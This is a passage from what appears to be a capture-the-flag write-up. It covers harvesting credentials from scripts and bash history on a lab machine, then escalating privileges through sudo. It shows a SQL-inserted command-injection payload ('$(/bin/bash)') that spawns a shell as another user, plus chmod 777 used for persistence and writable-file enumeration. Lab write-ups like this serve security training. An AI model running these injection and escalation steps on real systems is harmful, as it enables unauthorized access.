/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/save/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/functions.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/license.txt
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/tinymce.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/content.min.css
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/content.inline.min.css
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/fonts/tinymce-small.woff
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/fonts/tinymce-small.svg
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/fonts/tinymce-small.eot
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/fonts/tinymce.woff
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/fonts/tinymce-small.ttf
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/fonts/tinymce.ttf
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/fonts/tinymce-mobile.woff
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/fonts/tinymce.eot
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/fonts/tinymce.svg
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/skin.min.css
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/content.mobile.min.css
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/img/anchor.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/img/object.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/img/trans.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/img/loader.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/skins/lightgray/skin.mobile.min.css
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/el.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/sv.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/ja.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/pl.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/ru.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/th.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/hu.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/fa.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/sl.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/zh-cn.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/fi.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/da.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/pt_br.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/he.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/no.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/lt.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/nl.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/lv.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/zh-tw.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/pt.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/sk.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/ro.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/de.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/fr.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/es.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/bg.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/en.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/it.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/ca.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/tr.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/lang/hr.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/images/tinymce.png
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/themes/modern/theme.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/themes/mobile/theme.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/themes/inlite/theme.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/themes/silver/theme.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/tinymce.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/changelog.txt
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/jquery.tinymce.min.js
/var/www/html/app/pluck-4.7.13/data/modules/contactform/contactform.site.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/el.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/sv.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/ja.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/pl.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/ru.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/th.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/hu.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/fa.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/sl.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/zh-cn.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/fi.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/da.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/pt_br.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/he.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/no.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/lt.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/nl.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/lv.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/zh-tw.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/pt.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/sk.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/ro.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/de.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/fr.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/es.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/bg.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/en.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/it.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/ca.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/tr.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/lang/hr.php
/var/www/html/app/pluck-4.7.13/data/modules/contactform/images/contactform.png
/var/www/html/app/pluck-4.7.13/data/modules/contactform/contactform.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce.zip
/var/www/html/app/pluck-4.7.13/data/modules/albums/functions.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/albums_getimage.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/albums.admin.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/el.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/sv.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/ja.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/pl.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/ru.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/th.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/hu.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/fa.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/sl.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/zh-cn.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/fi.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/da.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/pt_br.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/he.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/no.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/lt.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/nl.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/lv.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/zh-tw.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/pt.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/sk.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/ro.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/de.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/fr.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/es.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/bg.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/en.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/it.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/ca.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/tr.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/lang/hr.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/images/albums.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/lytebox.js
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/lytebox.css
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/index.html
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/next_grey.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/close_red.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/prev_blue.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/prev_red.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/play_red.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/pause_green.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/prev_green.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/prev_gold.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/close_blue.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/blank.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/pause_gold.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/close_gold.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/loading.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/prev_grey_label.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/pause_grey.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/pause_blue.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/next_blue.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/play_green.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/play_blue.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/close_grey.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/next_gold.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/close_green.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/next_grey_label.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/play_gold.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/next_green.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/close_grey_label.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/next_red.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/play_grey.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/pause_red.png
/var/www/html/app/pluck-4.7.13/data/modules/albums/lib/lytebox/images/prev_grey.gif
/var/www/html/app/pluck-4.7.13/data/modules/albums/albums.site.php
/var/www/html/app/pluck-4.7.13/data/modules/albums/albums.php
/var/www/html/app/pluck-4.7.13/data/modules/.htaccess
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/viewsite.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/el.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/sv.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/ja.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/pl.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/ru.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/th.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/hu.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/fa.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/sl.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/zh-cn.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/fi.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/da.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/pt_br.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/he.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/no.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/lt.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/nl.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/lv.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/zh-tw.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/pt.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/sk.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/ro.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/de.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/fr.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/es.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/bg.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/en.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/it.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/ca.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/tr.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/lang/hr.php
/var/www/html/app/pluck-4.7.13/data/modules/viewsite/images/viewsite.png
/var/www/html/app/pluck-4.7.13/data/modules/blog/blog.site.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/functions.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/el.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/sv.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/ja.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/pl.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/ru.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/th.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/hu.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/fa.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/sl.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/zh-cn.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/fi.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/da.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/pt_br.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/he.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/no.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/lt.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/nl.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/lv.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/zh-tw.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/pt.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/sk.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/ro.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/de.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/fr.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/es.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/bg.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/en.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/it.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/ca.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/tr.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/lang/hr.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/images/blog.png
/var/www/html/app/pluck-4.7.13/data/modules/blog/images/reactions.png
/var/www/html/app/pluck-4.7.13/data/modules/blog/blog.php
/var/www/html/app/pluck-4.7.13/data/modules/blog/blog.admin.php
/var/www/html/app/pluck-4.7.13/data/trash/.trash
/var/www/html/app/pluck-4.7.13/data/themes/.htaccess
/var/www/html/app/pluck-4.7.13/data/themes/default/theme.php
/var/www/html/app/pluck-4.7.13/data/themes/default/license.txt
/var/www/html/app/pluck-4.7.13/data/themes/default/info.php
/var/www/html/app/pluck-4.7.13/data/themes/default/style.css
/var/www/html/app/pluck-4.7.13/data/themes/default/img/bghtml.jpg
/var/www/html/app/pluck-4.7.13/data/themes/default/img/bllt.gif
/var/www/html/app/pluck-4.7.13/data/themes/oldstyle/theme.php
/var/www/html/app/pluck-4.7.13/data/themes/oldstyle/info.php
/var/www/html/app/pluck-4.7.13/data/themes/oldstyle/style.css
/var/www/html/app/pluck-4.7.13/data/styleadmin.css
/var/www/html/app/pluck-4.7.13/images/a.jpeg
/var/www/html/app/pluck-4.7.13/images/a.php.jpg
/var/www/html/app/pluck-4.7.13/images/a.png
/var/www/html/app/pluck-4.7.13/images/.htaccess
/var/www/html/app/pluck-4.7.13/images/a.py.jpg
/var/www/html/app/pluck-4.7.13/images/a.jpg
/var/www/html/app/pluck-4.7.13/requirements.php
/var/www/html/app/pluck-4.7.13/admin.php
/var/www/html/app/pluck-4.7.13/index.php
/var/www/html/app/pluck-4.7.13/files/a.phar
/var/www/html/app/pluck-4.7.13/files/a.php4.txt
/var/www/html/app/pluck-4.7.13/files/c.phar
/var/www/html/app/pluck-4.7.13/files/a.php.txt
/var/www/html/app/pluck-4.7.13/files/.htaccess
/var/www/html/app/pluck-4.7.13/files/d.phar
/var/www/html/app/pluck-4.7.13/files/a.html
/var/www/html/app/pluck-4.7.13/files/b.phar
/var/www/html/app/pluck-4.7.13/files/a.py
/var/backups/dpkg.status.0
/var/backups/dpkg.statoverride.0
/var/backups/alternatives.tar.0
/var/backups/apt.extended_states.1.gz
/var/backups/dpkg.diversions.0
/var/backups/apt.extended_states.0
/opt/getDreams.py
/opt/test.py
/home/death/.wget-hsts
/home/death/.profile
/home/death/.bash_logout
/home/death/.bashrc
/home/ubuntu/.sudo_as_admin_successful
/home/ubuntu/.profile
/home/ubuntu/.bash_logout
/home/ubuntu/.bashrc
/home/lucien/.sudo_as_admin_successful
/home/lucien/.profile
/home/lucien/.bash_logout
/home/lucien/.bashrc
/home/morpheus/restore.py
/home/morpheus/.selected_editor
/home/morpheus/.profile
/home/morpheus/.bash_logout
/home/morpheus/.bashrc
/home/morpheus/kingdom
```

The interesting one is 2 files inside the /opt 

- getDreams.py
- test.py

Inside the file getDreams.py we the sql credentials of user death.

and inside the file test.py we found the password of lucien.

So we're going to login it with the id and pass in ssh.

And after login can now read the flag inside the lucien folder with ease.

Now we're going to enumurate here and there in this ssh shell.

When doing so i somehow looked into the file .bash_history and founded the mysql pass of user lucien.

![bash History](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ftlwpjzv91ed9sog1sxui.png)

After logging in into the mysql when i did 

```mysql
show databases;
```

What i got was many databases but one which seems interesting was 
library

So i entered into it and there was anothe table inside that it was dreams.

so i extracted all the data with

```mysql
select * from dreams;
```

the content inside it was 

```mysql
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
4 rows in set (0.00 sec)
```


![mysql](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ffvup30xo270kw7ly59ne.png)


When i did sudo -l in current terminal of ssh that is of lucien.


I got this entry


 (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py



and inside the file .bash_histroy too i got a line executing this command 



This command inside the .bash_history


```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

Meaning we could execute the file /home/death/getDreams.py as the root dream user without any password.

But for now it is not happening when i do so.

So we will look the getDreams file more closely

![get dreams 1](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F7h01l3wekne480nrf0a5.png)


![get dreams 2](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F7h01l3wekne480nrf0a5.png)


Now Looking at the code, the following vulnerability is observed Command Injection. The combination between the user input and shell=True results into a high risk of command injection. Basically, as a malicious actor can alter the integrity of the database by creating the name of the dreamer and instead of a legitimate input (like, the dream- Want to become a famous singer 🎤), would provide a command, with the final result of breaching the confidentiality. 


We are going to exploit that vulnebility by adding a new column in sql database of dreams.


With the command

```sql
INSERT INTO dreams VALUE ("martin","$(/bin/bash)");
```

Since see before it when we're executing 

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py

```

We were only getting 

```bash


 | Alice   | Flying in the sky                  |
 | Bob     | Exploring ancient ruins            |
 | Carol   | Becoming a successful entrepreneur |
 | Dave    | Becoming a professional musician   |
```

But since now we have inserted a new row so it should also be fetched which will lead in command execution.

Now after inserting that row when we execute that command

We got the shell as a user death.


We're going to ensure lucien has the privilege to run getDreams.py script by running chmod 777 getDreams.py. Essentially, this gives read, write, execute permissions, thus establishing persistence.

![chmod](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fios9h00kngywbs9vjxql.png)

Since we have now the shell as death so i tried why not get the password now 

But when i did cat death_flag.txt

It prompted back me nothing.

So this is not the way to get the flag.

Since we have set the permission to 777 meaningly the user lucien has full permit to that getDreams.py file.


So we are now exiting the death shell and read the content of getDreams file as the user lucien.


And this time when we read the read the file stored in /home/death that is 

getDreams.py


It contains the pass.


so i loggedin as death with 

```bash
su death
```

And we are now prompted to enter pass after entering the extracted pass we got the access and now we're ready to get the flag.

![death flag](https://miro.medium.com/v2/resize:fit:640/format:webp/1*AVkmKOrNy0wa000uyO8FAA.png)

Now its time for privilage escalation to the last user morpheus.


for this when we checked for the content inside the folder morpheus

- kingdom
- morpheus_glag.txt
- restore.py

the content inside the restore.py was 

```python3
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

Since we will also have not the permission to edit the file restore.py

So we need to find something else.

Now i tried to do manual privilage escalation we need to manually find misconfigured binaries.

first method to do is to check for file that are writable by user death(current user).

We will do it with command below

find / -writable -type f 2>/dev/null | grep -v 'proc'

Filtering proc cuz it full the ssh minimal terminal.

The noticable outputs are

```bash
/opt/getDreams.py
/home/death/.viminfo
/home/death/.mysql_history
/home/death/getDreams.py
/home/death/.bash_history
/home/death/.wget-hsts
/home/death/.profile
/home/death/.bash_logout
/home/death/death_flag.txt
/home/death/.bashrc
```

But all files are 

```bash
/var/www/html/app/pluck-4.7.13/data/settings/token.php
/var/www/html/app/pluck-4.7.13/data/settings/install.dat
/var/www/html/app/pluck-4.7.13/data/settings/langpref.php
/var/www/html/app/pluck-4.7.13/data/settings/update_lastcheck.php
/var/www/html/app/pluck-4.7.13/data/settings/pages/1.dreaming.php
/var/www/html/app/pluck-4.7.13/data/settings/themepref.php
/var/www/html/app/pluck-4.7.13/data/settings/pass.php
/var/www/html/app/pluck-4.7.13/data/settings/options.php
/usr/lib/python3.8/shutil.py
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.access
/sys/fs/cgroup/memory/user.slice/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/user@1000.service/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/session-25.scope/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/session-49.scope/cgroup.event_control
/sys/fs/cgroup/memory/cgroup.event_control
/sys/fs/cgroup/memory/init.scope/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-sysusers.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cloud-init-hotplugd.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-systemd\x2dfsck.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-systemd\x2dfsck.slice/systemd-fsck@dev-disk-by\x2duuid-b754eeb7\x2d3381\x2d430c\x2d9d1b\x2deec196ee0930.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/iscsid.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udevd-control.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snapd.apparmor.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udevd-kernel.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/finalrd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/serial-getty@ttyS0.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-networkd-wait-online.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/lvm2-lvmpolld.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/multipathd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-modprobe.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-journald-dev-log.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/ModemManager.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cloud-init-local.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-networkd.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snap-lxd-32662.mount/cgroup.event_control
